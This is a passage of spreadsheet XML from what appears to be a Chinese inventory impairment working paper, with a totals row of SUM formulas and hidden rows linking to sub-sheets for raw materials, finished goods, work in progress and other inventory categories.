      <c r="S15" s="322" t="n"/>
    </row>
    <row r="16" ht="17.25" customHeight="1" s="415">
      <c r="A16" s="284" t="n"/>
      <c r="B16" s="397" t="n"/>
      <c r="C16" s="327" t="n"/>
      <c r="D16" s="327" t="n"/>
      <c r="E16" s="327" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="347" t="n"/>
      <c r="K16" s="347" t="n"/>
      <c r="L16" s="347" t="n"/>
      <c r="M16" s="347" t="n"/>
      <c r="N16" s="347" t="n"/>
      <c r="O16" s="347" t="n"/>
      <c r="P16" s="347" t="n"/>
      <c r="Q16" s="347" t="n"/>
      <c r="R16" s="347" t="n"/>
      <c r="S16" s="322" t="n"/>
    </row>
    <row r="17" ht="17.25" customHeight="1" s="415">
      <c r="A17" s="380" t="n"/>
      <c r="B17" s="307" t="n"/>
      <c r="C17" s="327" t="n"/>
      <c r="D17" s="327" t="n"/>
      <c r="E17" s="327" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="347" t="n"/>
      <c r="K17" s="347" t="n"/>
      <c r="L17" s="347" t="n"/>
      <c r="M17" s="347" t="n"/>
      <c r="N17" s="347" t="n"/>
      <c r="O17" s="347" t="n"/>
      <c r="P17" s="347" t="n"/>
      <c r="Q17" s="347" t="n"/>
      <c r="R17" s="347" t="n"/>
      <c r="S17" s="322" t="n"/>
    </row>
    <row r="18" ht="17.25" customHeight="1" s="415">
      <c r="A18" s="380" t="n"/>
      <c r="B18" s="307" t="n"/>
      <c r="C18" s="327" t="n"/>
      <c r="D18" s="327" t="n"/>
      <c r="E18" s="327" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="347" t="n"/>
      <c r="K18" s="347" t="n"/>
      <c r="L18" s="347" t="n"/>
      <c r="M18" s="347" t="n"/>
      <c r="N18" s="347" t="n"/>
      <c r="O18" s="347" t="n"/>
      <c r="P18" s="347" t="n"/>
      <c r="Q18" s="347" t="n"/>
      <c r="R18" s="347" t="n"/>
      <c r="S18" s="322" t="n"/>
    </row>
    <row r="19" ht="17.25" customHeight="1" s="415">
      <c r="A19" s="380" t="n"/>
      <c r="B19" s="307" t="n"/>
      <c r="C19" s="327" t="n"/>
      <c r="D19" s="327" t="n"/>
      <c r="E19" s="327" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="347" t="n"/>
      <c r="K19" s="347" t="n"/>
      <c r="L19" s="347" t="n"/>
      <c r="M19" s="347" t="n"/>
      <c r="N19" s="347" t="n"/>
      <c r="O19" s="347" t="n"/>
      <c r="P19" s="347" t="n"/>
      <c r="Q19" s="347" t="n"/>
      <c r="R19" s="347" t="n"/>
      <c r="S19" s="322" t="n"/>
    </row>
    <row r="20" ht="17.25" customHeight="1" s="415">
      <c r="A20" s="380" t="n"/>
      <c r="B20" s="307" t="n"/>
      <c r="C20" s="327" t="n"/>
      <c r="D20" s="327" t="n"/>
      <c r="E20" s="327" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="347" t="n"/>
      <c r="K20" s="347" t="n"/>
      <c r="L20" s="347" t="n"/>
      <c r="M20" s="347" t="n"/>
      <c r="N20" s="347" t="n"/>
      <c r="O20" s="347" t="n"/>
      <c r="P20" s="347" t="n"/>
      <c r="Q20" s="347" t="n"/>
      <c r="R20" s="347" t="n"/>
      <c r="S20" s="322" t="n"/>
    </row>
    <row r="21" ht="17.25" customHeight="1" s="415">
      <c r="A21" s="380" t="n"/>
      <c r="B21" s="307" t="n"/>
      <c r="C21" s="327" t="n"/>
      <c r="D21" s="327" t="n"/>
      <c r="E21" s="327" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="347" t="n"/>
      <c r="K21" s="347" t="n"/>
      <c r="L21" s="347" t="n"/>
      <c r="M21" s="347" t="n"/>
      <c r="N21" s="347" t="n"/>
      <c r="O21" s="347" t="n"/>
      <c r="P21" s="347" t="n"/>
      <c r="Q21" s="347" t="n"/>
      <c r="R21" s="347" t="n"/>
      <c r="S21" s="322" t="n"/>
    </row>
    <row r="22" ht="17.25" customHeight="1" s="415">
      <c r="A22" s="380" t="n"/>
      <c r="B22" s="307" t="n"/>
      <c r="C22" s="327" t="n"/>
      <c r="D22" s="327" t="n"/>
      <c r="E22" s="327" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="347" t="n"/>
      <c r="K22" s="347" t="n"/>
      <c r="L22" s="347" t="n"/>
      <c r="M22" s="347" t="n"/>
      <c r="N22" s="347" t="n"/>
      <c r="O22" s="347" t="n"/>
      <c r="P22" s="347" t="n"/>
      <c r="Q22" s="347" t="n"/>
      <c r="R22" s="347" t="n"/>
      <c r="S22" s="322" t="n"/>
    </row>
    <row r="23" ht="17.25" customHeight="1" s="415">
      <c r="A23" s="383" t="n"/>
      <c r="B23" s="383" t="inlineStr">
        <is>
          <t>存货净额</t>
        </is>
      </c>
      <c r="C23" s="380" t="inlineStr">
        <is>
          <t>合           计</t>
        </is>
      </c>
      <c r="D23" s="591">
        <f>SUM(D6:D14)</f>
        <v/>
      </c>
      <c r="E23" s="591">
        <f>SUM(E6:E14)</f>
        <v/>
      </c>
      <c r="F23" s="591">
        <f>SUM(F6:F14)</f>
        <v/>
      </c>
      <c r="G23" s="591">
        <f>SUM(G6:G14)</f>
        <v/>
      </c>
      <c r="H23" s="591">
        <f>G23-F23</f>
        <v/>
      </c>
      <c r="I23" s="591">
        <f>IF(F23=0,"",H23/F23*100)</f>
        <v/>
      </c>
      <c r="J23" s="340" t="n"/>
      <c r="K23" s="347" t="n"/>
      <c r="L23" s="347" t="n"/>
      <c r="M23" s="347" t="n"/>
      <c r="N23" s="347" t="n"/>
      <c r="O23" s="347" t="n"/>
      <c r="P23" s="347" t="n"/>
      <c r="Q23" s="347" t="n"/>
      <c r="R23" s="347" t="n"/>
      <c r="S23" s="322" t="n"/>
    </row>
    <row r="24" s="415">
      <c r="A24" s="346" t="n"/>
      <c r="B24" s="346" t="n"/>
      <c r="C24" s="347" t="n"/>
      <c r="D24" s="347" t="n"/>
      <c r="E24" s="347" t="n"/>
      <c r="F24" s="347" t="n"/>
      <c r="G24" s="184" t="n"/>
      <c r="H24" s="550" t="n"/>
      <c r="I24" s="550" t="n"/>
      <c r="J24" s="347" t="n"/>
      <c r="K24" s="347" t="n"/>
      <c r="L24" s="347" t="n"/>
      <c r="M24" s="347" t="n"/>
      <c r="N24" s="347" t="n"/>
      <c r="O24" s="347" t="n"/>
      <c r="P24" s="347" t="n"/>
      <c r="Q24" s="347" t="n"/>
      <c r="R24" s="347" t="n"/>
      <c r="S24" s="322" t="n"/>
    </row>
    <row r="25" s="415">
      <c r="A25" s="344" t="n"/>
      <c r="B25" s="344" t="n"/>
      <c r="C25" s="325" t="n"/>
      <c r="D25" s="325" t="n"/>
      <c r="E25" s="325" t="n"/>
      <c r="F25" s="592" t="n"/>
      <c r="G25" s="592" t="n"/>
      <c r="H25" s="592" t="n"/>
      <c r="I25" s="347" t="n"/>
      <c r="J25" s="347" t="n"/>
      <c r="K25" s="347" t="n"/>
      <c r="L25" s="347" t="n"/>
      <c r="M25" s="347" t="n"/>
      <c r="N25" s="347" t="n"/>
      <c r="O25" s="347" t="n"/>
      <c r="P25" s="347" t="n"/>
      <c r="Q25" s="347" t="n"/>
      <c r="R25" s="347" t="n"/>
      <c r="S25" s="322" t="n"/>
    </row>
    <row r="26" s="415">
      <c r="A26" s="344" t="n"/>
      <c r="B26" s="344" t="n"/>
      <c r="C26" s="325" t="n"/>
      <c r="D26" s="347" t="n"/>
      <c r="E26" s="347" t="n"/>
      <c r="F26" s="347" t="n"/>
      <c r="G26" s="347" t="n"/>
      <c r="H26" s="592" t="n"/>
      <c r="I26" s="347" t="n"/>
      <c r="J26" s="347" t="n"/>
      <c r="K26" s="347" t="n"/>
      <c r="L26" s="347" t="n"/>
      <c r="M26" s="347" t="n"/>
      <c r="N26" s="347" t="n"/>
      <c r="O26" s="347" t="n"/>
      <c r="P26" s="347" t="n"/>
      <c r="Q26" s="347" t="n"/>
      <c r="R26" s="347" t="n"/>
      <c r="S26" s="322" t="n"/>
    </row>
    <row r="27" s="415">
      <c r="A27" s="344" t="n"/>
      <c r="B27" s="344" t="n"/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347" t="n"/>
      <c r="R27" s="347" t="n"/>
      <c r="S27" s="322" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="A28" s="344" t="n"/>
      <c r="B28" s="344" t="n"/>
      <c r="C28" s="347" t="n"/>
      <c r="D28" s="347" t="n"/>
      <c r="E28" s="347" t="n"/>
      <c r="F28" s="347" t="n"/>
      <c r="G28" s="347" t="n"/>
      <c r="H28" s="347" t="n"/>
      <c r="I28" s="347" t="n"/>
      <c r="J28" s="347" t="n"/>
      <c r="K28" s="347" t="n"/>
      <c r="L28" s="347" t="n"/>
      <c r="M28" s="347" t="n"/>
      <c r="N28" s="347" t="n"/>
      <c r="O28" s="347" t="n"/>
      <c r="P28" s="347" t="n"/>
      <c r="Q28" s="347" t="n"/>
      <c r="R28" s="347" t="n"/>
      <c r="S28" s="322" t="n"/>
    </row>
    <row r="29" s="415">
      <c r="A29" s="344" t="n"/>
      <c r="B29" s="344" t="n"/>
      <c r="C29" s="156" t="n"/>
      <c r="D29" s="347" t="n"/>
      <c r="E29" s="347" t="n"/>
      <c r="F29" s="592" t="n"/>
      <c r="G29" s="347" t="n"/>
      <c r="H29" s="347" t="n"/>
      <c r="I29" s="347" t="n"/>
      <c r="J29" s="347" t="n"/>
      <c r="K29" s="347" t="n"/>
      <c r="L29" s="347" t="n"/>
      <c r="M29" s="347" t="n"/>
      <c r="N29" s="347" t="n"/>
      <c r="O29" s="347" t="n"/>
      <c r="P29" s="347" t="n"/>
      <c r="Q29" s="347" t="n"/>
      <c r="R29" s="347" t="n"/>
      <c r="S29" s="322" t="n"/>
    </row>
    <row r="30" s="415">
      <c r="A30" s="347" t="n"/>
      <c r="B30" s="347" t="n"/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347" t="n"/>
      <c r="R30" s="347" t="n"/>
      <c r="S30" s="322" t="n"/>
    </row>
    <row r="31" s="415">
      <c r="A31" s="347" t="n"/>
      <c r="B31" s="347" t="n"/>
      <c r="C31" s="347" t="n"/>
      <c r="D31" s="347" t="n"/>
      <c r="E31" s="347" t="n"/>
      <c r="F31" s="347" t="n"/>
      <c r="G31" s="347" t="n"/>
      <c r="H31" s="347" t="n"/>
      <c r="I31" s="347" t="n"/>
      <c r="J31" s="347" t="n"/>
      <c r="K31" s="347" t="n"/>
      <c r="L31" s="347" t="n"/>
      <c r="M31" s="347" t="n"/>
      <c r="N31" s="347" t="n"/>
      <c r="O31" s="347" t="n"/>
      <c r="P31" s="347" t="n"/>
      <c r="Q31" s="347" t="n"/>
      <c r="R31" s="347" t="n"/>
      <c r="S31" s="322" t="n"/>
    </row>
    <row r="32" s="415">
      <c r="A32" s="347" t="n"/>
      <c r="B32" s="347" t="n"/>
      <c r="C32" s="347" t="n"/>
      <c r="D32" s="347" t="n"/>
      <c r="E32" s="347" t="n"/>
      <c r="F32" s="592" t="n"/>
      <c r="G32" s="347" t="n"/>
      <c r="H32" s="347" t="n"/>
      <c r="I32" s="347" t="n"/>
      <c r="J32" s="347" t="n"/>
      <c r="K32" s="347" t="n"/>
      <c r="L32" s="347" t="n"/>
      <c r="M32" s="347" t="n"/>
      <c r="N32" s="347" t="n"/>
      <c r="O32" s="347" t="n"/>
      <c r="P32" s="347" t="n"/>
      <c r="Q32" s="347" t="n"/>
      <c r="R32" s="347" t="n"/>
      <c r="S32" s="322" t="n"/>
    </row>
    <row r="33" hidden="1" s="415">
      <c r="A33" s="284" t="inlineStr">
        <is>
          <t>3-9-1</t>
        </is>
      </c>
      <c r="B33" s="91" t="inlineStr">
        <is>
          <t>采购跌价</t>
        </is>
      </c>
      <c r="C33" s="327" t="inlineStr">
        <is>
          <t>材料采购（在途物资）</t>
        </is>
      </c>
      <c r="D33" s="327" t="n"/>
      <c r="E33" s="327" t="n"/>
      <c r="F33" s="555">
        <f>'3-9-1在途物资'!G27</f>
        <v/>
      </c>
      <c r="G33" s="555">
        <f>'3-9-1在途物资'!J27</f>
        <v/>
      </c>
      <c r="H33" s="347" t="n"/>
      <c r="I33" s="347" t="n"/>
      <c r="J33" s="347" t="n"/>
      <c r="K33" s="347" t="n"/>
      <c r="L33" s="347" t="n"/>
      <c r="M33" s="347" t="n"/>
      <c r="N33" s="347" t="n"/>
      <c r="O33" s="347" t="n"/>
      <c r="P33" s="347" t="n"/>
      <c r="Q33" s="347" t="n"/>
      <c r="R33" s="347" t="n"/>
      <c r="S33" s="322" t="n"/>
    </row>
    <row r="34" hidden="1" s="415">
      <c r="A34" s="284" t="inlineStr">
        <is>
          <t>3-9-2</t>
        </is>
      </c>
      <c r="B34" s="397" t="inlineStr">
        <is>
          <t>原材跌价</t>
        </is>
      </c>
      <c r="C34" s="182" t="inlineStr">
        <is>
          <t>原材料</t>
        </is>
      </c>
      <c r="D34" s="182" t="n"/>
      <c r="E34" s="182" t="n"/>
      <c r="F34" s="555">
        <f>'3-9-2原材料'!H27</f>
        <v/>
      </c>
      <c r="G34" s="555">
        <f>'3-9-2原材料'!K27</f>
        <v/>
      </c>
      <c r="H34" s="347" t="n"/>
      <c r="I34" s="347" t="n"/>
      <c r="J34" s="347" t="n"/>
      <c r="K34" s="347" t="n"/>
      <c r="L34" s="347" t="n"/>
      <c r="M34" s="347" t="n"/>
      <c r="N34" s="347" t="n"/>
      <c r="O34" s="347" t="n"/>
      <c r="P34" s="347" t="n"/>
      <c r="Q34" s="347" t="n"/>
      <c r="R34" s="347" t="n"/>
      <c r="S34" s="322" t="n"/>
    </row>
    <row r="35" hidden="1" s="415">
      <c r="A35" s="284" t="inlineStr">
        <is>
          <t>3-9-3</t>
        </is>
      </c>
      <c r="B35" s="397" t="inlineStr">
        <is>
          <t>在库跌价</t>
        </is>
      </c>
      <c r="C35" s="182" t="inlineStr">
        <is>
          <t>在库周转材料</t>
        </is>
      </c>
      <c r="D35" s="182" t="n"/>
      <c r="E35" s="182" t="n"/>
      <c r="F35" s="555">
        <f>'3-9-3在库周转材料'!H27</f>
        <v/>
      </c>
      <c r="G35" s="555">
        <f>'3-9-3在库周转材料'!K27</f>
        <v/>
      </c>
      <c r="H35" s="347" t="n"/>
      <c r="I35" s="347" t="n"/>
      <c r="J35" s="347" t="n"/>
      <c r="K35" s="347" t="n"/>
      <c r="L35" s="347" t="n"/>
      <c r="M35" s="347" t="n"/>
      <c r="N35" s="347" t="n"/>
      <c r="O35" s="347" t="n"/>
      <c r="P35" s="347" t="n"/>
      <c r="Q35" s="347" t="n"/>
      <c r="R35" s="347" t="n"/>
      <c r="S35" s="322" t="n"/>
    </row>
    <row r="36" hidden="1" s="415">
      <c r="A36" s="284" t="inlineStr">
        <is>
          <t>3-9-4</t>
        </is>
      </c>
      <c r="B36" s="397" t="inlineStr">
        <is>
          <t>委加跌价</t>
        </is>
      </c>
      <c r="C36" s="182" t="inlineStr">
        <is>
          <t>委托加工物资</t>
        </is>
      </c>
      <c r="D36" s="182" t="n"/>
      <c r="E36" s="182" t="n"/>
      <c r="F36" s="555">
        <f>'3-9-4委托加工物资'!H27</f>
        <v/>
      </c>
      <c r="G36" s="555">
        <f>'3-9-4委托加工物资'!K27</f>
        <v/>
      </c>
      <c r="H36" s="347" t="n"/>
      <c r="I36" s="347" t="n"/>
      <c r="J36" s="347" t="n"/>
      <c r="K36" s="347" t="n"/>
      <c r="L36" s="347" t="n"/>
      <c r="M36" s="347" t="n"/>
      <c r="N36" s="347" t="n"/>
      <c r="O36" s="347" t="n"/>
      <c r="P36" s="347" t="n"/>
      <c r="Q36" s="347" t="n"/>
      <c r="R36" s="347" t="n"/>
      <c r="S36" s="322" t="n"/>
    </row>
    <row r="37" hidden="1" s="415">
      <c r="A37" s="284" t="inlineStr">
        <is>
          <t>3-9-5</t>
        </is>
      </c>
      <c r="B37" s="397" t="inlineStr">
        <is>
          <t>产成跌价</t>
        </is>
      </c>
      <c r="C37" s="182" t="inlineStr">
        <is>
          <t>产成品（库存商品）</t>
        </is>
      </c>
      <c r="D37" s="182" t="n"/>
      <c r="E37" s="182" t="n"/>
      <c r="F37" s="555">
        <f>'3-9-5产成品（库存商品）'!H27</f>
        <v/>
      </c>
      <c r="G37" s="555">
        <f>'3-9-5产成品（库存商品）'!L27</f>
        <v/>
      </c>
      <c r="H37" s="347" t="n"/>
      <c r="I37" s="347" t="n"/>
      <c r="J37" s="347" t="n"/>
      <c r="K37" s="347" t="n"/>
      <c r="L37" s="347" t="n"/>
      <c r="M37" s="347" t="n"/>
      <c r="N37" s="347" t="n"/>
      <c r="O37" s="347" t="n"/>
      <c r="P37" s="347" t="n"/>
      <c r="Q37" s="347" t="n"/>
      <c r="R37" s="347" t="n"/>
      <c r="S37" s="322" t="n"/>
    </row>
    <row r="38" hidden="1" s="415">
      <c r="A38" s="284" t="inlineStr">
        <is>
          <t>3-9-6</t>
        </is>
      </c>
      <c r="B38" s="397" t="inlineStr">
        <is>
          <t>在产跌价</t>
        </is>
      </c>
      <c r="C38" s="182" t="inlineStr">
        <is>
          <t>在产品（自制半成品）</t>
        </is>
      </c>
      <c r="D38" s="182" t="n"/>
      <c r="E38" s="182" t="n"/>
      <c r="F38" s="555">
        <f>'3-9-6在产品（自制半成品）'!H27</f>
        <v/>
      </c>
      <c r="G38" s="555">
        <f>'3-9-6在产品（自制半成品）'!K27</f>
        <v/>
      </c>
      <c r="H38" s="347" t="n"/>
      <c r="I38" s="347" t="n"/>
      <c r="J38" s="347" t="n"/>
      <c r="K38" s="347" t="n"/>
      <c r="L38" s="347" t="n"/>
      <c r="M38" s="347" t="n"/>
      <c r="N38" s="347" t="n"/>
      <c r="O38" s="347" t="n"/>
      <c r="P38" s="347" t="n"/>
      <c r="Q38" s="347" t="n"/>
      <c r="R38" s="347" t="n"/>
      <c r="S38" s="322" t="n"/>
    </row>
    <row r="39" hidden="1" s="415">
      <c r="A39" s="284" t="inlineStr">
        <is>
          <t>3-9-7</t>
        </is>
      </c>
      <c r="B39" s="397" t="inlineStr">
        <is>
          <t>发出跌价</t>
        </is>
      </c>
      <c r="C39" s="182" t="inlineStr">
        <is>
          <t>发出商品</t>
        </is>
      </c>
      <c r="D39" s="182" t="n"/>
      <c r="E39" s="182" t="n"/>
      <c r="F39" s="555">
        <f>'3-9-7发出商品'!H27</f>
        <v/>
      </c>
      <c r="G39" s="555">
        <f>'3-9-7发出商品'!K27</f>
        <v/>
      </c>
      <c r="H39" s="347" t="n"/>
      <c r="I39" s="347" t="n"/>
      <c r="J39" s="347" t="n"/>
      <c r="K39" s="347" t="n"/>
      <c r="L39" s="347" t="n"/>
      <c r="M39" s="347" t="n"/>
      <c r="N39" s="347" t="n"/>
      <c r="O39" s="347" t="n"/>
      <c r="P39" s="347" t="n"/>
      <c r="Q39" s="347" t="n"/>
      <c r="R39" s="347" t="n"/>
      <c r="S39" s="322" t="n"/>
    </row>
    <row r="40" hidden="1" s="415">
      <c r="A40" s="284" t="inlineStr">
        <is>
          <t>3-9-8</t>
        </is>
      </c>
      <c r="B40" s="397" t="inlineStr">
        <is>
          <t>在用跌价</t>
        </is>
      </c>
      <c r="C40" s="182" t="inlineStr">
        <is>
          <t>在用周转材料</t>
        </is>
      </c>
      <c r="D40" s="182" t="n"/>
      <c r="E40" s="182" t="n"/>
      <c r="F40" s="555">
        <f>'3-9-8在用周转材料'!H27</f>
        <v/>
      </c>
      <c r="G40" s="555">
        <f>'3-9-8在用周转材料'!L27</f>
        <v/>
      </c>
      <c r="H40" s="347" t="n"/>
      <c r="I40" s="347" t="n"/>
      <c r="J40" s="347" t="n"/>
      <c r="K40" s="347" t="n"/>
      <c r="L40" s="347" t="n"/>
      <c r="M40" s="347" t="n"/>
      <c r="N40" s="347" t="n"/>
      <c r="O40" s="347" t="n"/>
      <c r="P40" s="347" t="n"/>
      <c r="Q40" s="347" t="n"/>
      <c r="R40" s="347" t="n"/>
      <c r="S40" s="322" t="n"/>
    </row>
    <row r="41" s="415">
      <c r="A41" s="347" t="n"/>
      <c r="B41" s="347" t="n"/>
      <c r="C41" s="347" t="n"/>
      <c r="D41" s="347" t="n"/>
      <c r="E41" s="347" t="n"/>
      <c r="F41" s="347" t="n"/>
      <c r="G41" s="347" t="n"/>
      <c r="H41" s="347" t="n"/>
      <c r="I41" s="347" t="n"/>
      <c r="J41" s="347" t="n"/>
      <c r="K41" s="347" t="n"/>
      <c r="L41" s="347" t="n"/>
      <c r="M41" s="347" t="n"/>
      <c r="N41" s="347" t="n"/>
      <c r="O41" s="347" t="n"/>
      <c r="P41" s="347" t="n"/>
      <c r="Q41" s="347" t="n"/>
      <c r="R41" s="347" t="n"/>
      <c r="S41" s="322" t="n"/>
    </row>
    <row r="42" s="415">
      <c r="A42" s="347" t="n"/>
      <c r="B42" s="347" t="n"/>
      <c r="C42" s="347" t="n"/>
      <c r="D42" s="347" t="n"/>
      <c r="E42" s="347" t="n"/>
      <c r="F42" s="347" t="n"/>
      <c r="G42" s="347" t="n"/>
      <c r="H42" s="347" t="n"/>
      <c r="I42" s="347" t="n"/>
      <c r="J42" s="347" t="n"/>
      <c r="K42" s="347" t="n"/>
      <c r="L42" s="347" t="n"/>
      <c r="M42" s="347" t="n"/>
      <c r="N42" s="347" t="n"/>
      <c r="O42" s="347" t="n"/>
      <c r="P42" s="347" t="n"/>
      <c r="Q42" s="347" t="n"/>
      <c r="R42" s="347" t="n"/>
      <c r="S42" s="322" t="n"/>
    </row>
    <row r="43" s="415">
      <c r="A43" s="347" t="n"/>
      <c r="B43" s="347" t="n"/>
      <c r="C43" s="347" t="n"/>
      <c r="D43" s="347" t="n"/>
      <c r="E43" s="347" t="n"/>
      <c r="F43" s="347" t="n"/>
      <c r="G43" s="347" t="n"/>
      <c r="H43" s="347" t="n"/>
      <c r="I43" s="347" t="n"/>
      <c r="J43" s="347" t="n"/>
      <c r="K43" s="347" t="n"/>
      <c r="L43" s="347" t="n"/>
      <c r="M43" s="347" t="n"/>
      <c r="N43" s="347" t="n"/>
      <c r="O43" s="347" t="n"/>
      <c r="P43" s="347" t="n"/>
      <c r="Q43" s="347" t="n"/>
      <c r="R43" s="347" t="n"/>
      <c r="S43" s="322" t="n"/>
    </row>
    <row r="44" s="415">
      <c r="A44" s="347" t="n"/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7" t="n"/>
      <c r="L44" s="347" t="n"/>
      <c r="M44" s="347" t="n"/>
      <c r="N44" s="347" t="n"/>
      <c r="O44" s="347" t="n"/>
      <c r="P44" s="347" t="n"/>
      <c r="Q44" s="347" t="n"/>
      <c r="R44" s="347" t="n"/>
      <c r="S44" s="322" t="n"/>
    </row>
    <row r="45" s="415">
      <c r="A45" s="347" t="n"/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7" t="n"/>
      <c r="L45" s="347" t="n"/>
      <c r="M45" s="347" t="n"/>
      <c r="N45" s="347" t="n"/>
      <c r="O45" s="347" t="n"/>
      <c r="P45" s="347" t="n"/>
      <c r="Q45" s="347" t="n"/>
      <c r="R45" s="347" t="n"/>
      <c r="S45" s="322" t="n"/>
    </row>
    <row r="46" s="415">
      <c r="A46" s="347" t="n"/>
      <c r="B46" s="347" t="n"/>
      <c r="C46" s="347" t="n"/>
      <c r="D46" s="347" t="n"/>
      <c r="E46" s="347" t="n"/>
      <c r="F46" s="347" t="n"/>
      <c r="G46" s="347" t="n"/>
      <c r="H46" s="347" t="n"/>
      <c r="I46" s="347" t="n"/>
      <c r="J46" s="347" t="n"/>
      <c r="K46" s="347" t="n"/>
      <c r="L46" s="347" t="n"/>
      <c r="M46" s="347" t="n"/>
      <c r="N46" s="347" t="n"/>
      <c r="O46" s="347" t="n"/>
      <c r="P46" s="347" t="n"/>
      <c r="Q46" s="347" t="n"/>
      <c r="R46" s="347" t="n"/>
      <c r="S46" s="322" t="n"/>
    </row>
    <row r="47" s="415">
      <c r="A47" s="347" t="n"/>
      <c r="B47" s="347" t="n"/>
      <c r="C47" s="347" t="n"/>
      <c r="D47" s="347" t="n"/>
      <c r="E47" s="347" t="n"/>
      <c r="F47" s="347" t="n"/>
      <c r="G47" s="347" t="n"/>
      <c r="H47" s="347" t="n"/>
      <c r="I47" s="347" t="n"/>
      <c r="J47" s="347" t="n"/>
      <c r="K47" s="347" t="n"/>
      <c r="L47" s="347" t="n"/>
      <c r="M47" s="347" t="n"/>
      <c r="N47" s="347" t="n"/>
      <c r="O47" s="347" t="n"/>
      <c r="P47" s="347" t="n"/>
      <c r="Q47" s="347" t="n"/>
      <c r="R47" s="347" t="n"/>
      <c r="S47" s="322" t="n"/>
    </row>
    <row r="48" s="415">
      <c r="A48" s="347" t="n"/>
      <c r="B48" s="347" t="n"/>
      <c r="C48" s="347" t="n"/>
      <c r="H48" s="347" t="n"/>
      <c r="I48" s="347" t="n"/>
      <c r="J48" s="347" t="n"/>
      <c r="K48" s="347" t="n"/>
      <c r="L48" s="347" t="n"/>
      <c r="M48" s="347" t="n"/>
      <c r="N48" s="347" t="n"/>
      <c r="O48" s="347" t="n"/>
      <c r="P48" s="347" t="n"/>
      <c r="Q48" s="347" t="n"/>
      <c r="R48" s="347" t="n"/>
      <c r="S48" s="322" t="n"/>
    </row>
    <row r="49" s="415">
      <c r="A49" s="347" t="n"/>
      <c r="B49" s="347" t="n"/>
      <c r="C49" s="347" t="n"/>
      <c r="D49" s="347" t="n"/>
      <c r="E49" s="347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47" t="n"/>
      <c r="O49" s="347" t="n"/>
      <c r="P49" s="347" t="n"/>
      <c r="Q49" s="347" t="n"/>
      <c r="R49" s="347" t="n"/>
      <c r="S49" s="322" t="n"/>
    </row>
    <row r="50" s="415">
      <c r="A50" s="347" t="n"/>
      <c r="B50" s="347" t="n"/>
      <c r="C50" s="347" t="n"/>
      <c r="D50" s="347" t="n"/>
      <c r="E50" s="347" t="n"/>
      <c r="F50" s="347" t="n"/>
      <c r="G50" s="347" t="n"/>
      <c r="H50" s="347" t="n"/>
      <c r="I50" s="347" t="n"/>
      <c r="J50" s="347" t="n"/>
      <c r="K50" s="347" t="n"/>
      <c r="L50" s="347" t="n"/>
      <c r="M50" s="347" t="n"/>
      <c r="N50" s="347" t="n"/>
      <c r="O50" s="347" t="n"/>
      <c r="P50" s="347" t="n"/>
      <c r="Q50" s="347" t="n"/>
      <c r="R50" s="347" t="n"/>
      <c r="S50" s="322" t="n"/>
    </row>
    <row r="51" s="415">
      <c r="A51" s="347" t="n"/>
      <c r="B51" s="347" t="n"/>
      <c r="C51" s="347" t="n"/>
      <c r="D51" s="347" t="n"/>
      <c r="E51" s="347" t="n"/>
      <c r="F51" s="347" t="n"/>
      <c r="G51" s="347" t="n"/>
      <c r="H51" s="347" t="n"/>
      <c r="I51" s="347" t="n"/>
      <c r="J51" s="347" t="n"/>
      <c r="K51" s="347" t="n"/>
      <c r="L51" s="347" t="n"/>
      <c r="M51" s="347" t="n"/>
      <c r="N51" s="347" t="n"/>
      <c r="O51" s="347" t="n"/>
      <c r="P51" s="347" t="n"/>
      <c r="Q51" s="347" t="n"/>
      <c r="R51" s="347" t="n"/>
      <c r="S51" s="322" t="n"/>
    </row>
    <row r="52" s="415">
      <c r="A52" s="347" t="n"/>
      <c r="B52" s="347" t="n"/>
      <c r="C52" s="347" t="n"/>
      <c r="D52" s="347" t="n"/>
      <c r="E52" s="347" t="n"/>
      <c r="F52" s="347" t="n"/>
      <c r="G52" s="347" t="n"/>
      <c r="H52" s="347" t="n"/>
      <c r="I52" s="347" t="n"/>
      <c r="J52" s="347" t="n"/>
      <c r="K52" s="347" t="n"/>
      <c r="L52" s="347" t="n"/>
      <c r="M52" s="347" t="n"/>
      <c r="N52" s="347" t="n"/>
      <c r="O52" s="347" t="n"/>
      <c r="P52" s="347" t="n"/>
      <c r="Q52" s="347" t="n"/>
      <c r="R52" s="347" t="n"/>
      <c r="S52" s="322" t="n"/>
    </row>
    <row r="53" s="415">
      <c r="A53" s="347" t="n"/>
      <c r="B53" s="347" t="n"/>
      <c r="C53" s="347" t="n"/>
      <c r="D53" s="347" t="n"/>
      <c r="E53" s="347" t="n"/>
      <c r="F53" s="347" t="n"/>
      <c r="G53" s="347" t="n"/>
      <c r="H53" s="347" t="n"/>
      <c r="I53" s="347" t="n"/>
      <c r="J53" s="347" t="n"/>
      <c r="K53" s="347" t="n"/>
      <c r="L53" s="347" t="n"/>
      <c r="M53" s="347" t="n"/>
      <c r="N53" s="347" t="n"/>
      <c r="O53" s="347" t="n"/>
      <c r="P53" s="347" t="n"/>
      <c r="Q53" s="347" t="n"/>
      <c r="R53" s="347" t="n"/>
      <c r="S53" s="322" t="n"/>
    </row>
    <row r="54" s="415">
      <c r="A54" s="347" t="n"/>
      <c r="B54" s="347" t="n"/>
      <c r="C54" s="347" t="n"/>
      <c r="D54" s="347" t="n"/>
      <c r="E54" s="347" t="n"/>
      <c r="F54" s="347" t="n"/>
      <c r="G54" s="347" t="n"/>
      <c r="H54" s="347" t="n"/>
      <c r="I54" s="347" t="n"/>
